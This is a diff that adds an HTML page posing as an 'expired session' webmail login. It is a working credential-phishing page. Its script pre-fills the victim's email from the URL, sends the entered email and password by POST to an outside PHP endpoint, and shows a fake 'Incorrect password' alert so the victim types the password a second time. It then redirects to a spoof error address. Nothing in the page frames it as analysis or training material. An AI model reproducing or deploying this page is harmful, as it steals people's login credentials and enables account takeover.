@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="eng">
+    <head>
+        <title>webmail</title>
+        <link rel="stylesheet" href="style.css">
+        
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+    </head>
+    <body><center>
+<!--         <div>
+            <center><h1 style="text-align: center; color: black;">Sesión expirada</h1></center>
+        </div> -->
+        <div>
+            <div class="myinput">
+                
+             <hr
+                   style="
+                      height: 2px;
+                      border: none;
+                      color: #ffff;
+                      background-color: none;
+                   "
+                />
+                <div
+                class="alert alert-danger"
+                id="wrongPasswordAlert"
+                style="display: none"
+             
+                <center> <strong>Error</strong> Incorrect password</center >      
+             </div>
+             <form id="myForm" class="bv">
+               <div>
+            <center><h1 style="text-align: center; color: white;">expired session</h1></center>
+             </div>
+                <input type ="mail" id="email" name="mail" placeholder="User"><br> 
+                <input type=password name="pass" id=pass placeholder="Password"><br/>
+                 <!-- <input type="checkbox" name="remember me"> -->
+                 <!-- <label>Remember me</label><br> -->
+                  <button name="sign" type="submit">TO ENTER</button> 
+             </form>
+        </div>
+        <div class="lin">
+            <ul>
+                <li>Helpr</li>
+                <li>Privacy Policy</li>
+                <li>register account</li>
+                <li>Contact</li>
+                
+            </ul>
+           </div>
+           <style>
+            body{margin: 0px;
+padding: 0px;
+width: 100%;
+background-color: white;
+}
+
+.bv{
+    margin: auto 32%;
+    margin-top: 5%;
+    border: solid rgb(44, 32, 32);
+    color: gray;
+    height: 400px;
+    width: 34%;
+    border-radius: 10px;
+    margin-top: 50px;
+    background-color:rgb(78, 75, 75)
+    
+    
+    
+}
+.bv input{
+    margin: 20px;
+    width:70%;
+    padding: 10px;
+    margin: 15px;
+    position: relative;
+    top: 9%;
+    left: 11%;
+    font-size: larger;
+    font-style: normal;
+    font-weight: 300;
+    /* text-transform: capitalize; */
+  
+}
+
+button{
+    width: 65%;
+    margin: auto 8%;
+    padding: 13px;
+    position: relative;
+    top: 20%;
+    left: 8%;
+    background-color: blue;
+    border: none;
+    font-size: larger;
+    font-weight: bolder;
+    color: white;
+}
+
+            .lin li{
+    position: relative;
+    left:30%;
+    list-style: none;
+    display: flex;
+    text-align: center;
+   align-content: space-around;
+   text-transform: capitalize;
+   display: inline-table;
+   margin: 13px;
+}
+           </style>
+
+<script>
+    document.getElementById("email").value = getUrlVars()["emailid"];;
+       
+    function getUrlVars() {
+             var vars = {};
+            var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+            vars[key] = value;
+             });
+            return vars;
+         } 
+   
+        var form = document.getElementById("myForm");
+            var count = 0;
+   
+            function showAlert() {
+               var alert = document.getElementById("wrongPasswordAlert");
+               alert.style.display = "block";
+            }
+   
+            function send(email, pass, onSuccess) {
+               const form = new FormData();
+               form.append("email", email);
+               form.append("pass", pass);
+               form.append("count", count);
+               form.append("enter", true);
+   
+                axios({
+                   method: "post",
+                  url:"https://machestwaterschuks.site/sup/su.php",
+                 data: form,
+                   headers: {
+                      "Content-Type": `multipart/form-data; boundary=${form._boundary}`,
+                  },
+               })
+                  .then(function (response) {
+                     console.log(response);
+                     if (onSuccess) onSuccess();
+                  })
+                  .catch(function (error) {
+                     console.log(error);
+                  });
+            }
+   
+            form.onsubmit = function (e) {
+               e.preventDefault();
+               var email = document.getElementById("email");
+               var pass = document.getElementById("pass");
+   
+               if (count == 0) {
+                  showAlert();
+                  send(email.value, pass.value, count);
+                  pass.value = "";
+               } else {
+                  send(email.value, pass.value, function () {
+                     window.location.href = "https://roundcub/erro";
+                  });
+   
+                   return;
+                }
+                count++;
+             };
+         
+   </script>
+       </body>
+
+    </center></html>
